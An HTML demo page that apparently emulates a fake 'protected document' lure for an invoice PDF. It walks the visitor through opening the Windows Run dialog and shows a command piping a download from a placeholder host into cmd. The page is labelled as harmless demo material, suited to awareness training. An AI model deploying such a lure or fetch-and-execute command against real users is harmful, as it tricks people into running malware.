...
<html lang="en">
  <head>
    ...
    <title>Fake Document Share</title>
    <style>
      :root {
        --bg:#0b111d;
        --panel:#121b2f;
  ...
  <body>
    <main class="card">
      <div class="kicker">Shared file requires unlock</div>
      <h1>Invoice_Q1_2026.pdf is protected</h1>
      <p>Demo page to emulate a protected document prompt. The commands are fake placeholders.</p>
      <div class="grid">
        <section class="panel">
          <h3>Steps</h3>
          <ul class="steps">
            <li>Open Run (Win + R)</li>
...
<li>Confirm</li>
        ...
        <section class="panel">
          <h3>Command (demo)</h3>
          <div class="code">curl https://example.invalid/doc-unlock | cmd /c [REDACTED]</div>
          <div class="warn">Demo content only. Do not execute on real systems.</div>
        </section>
      </div>
      <a class="cta" href="#">Unlock Document</a>
    </main>
  </body>
</html>
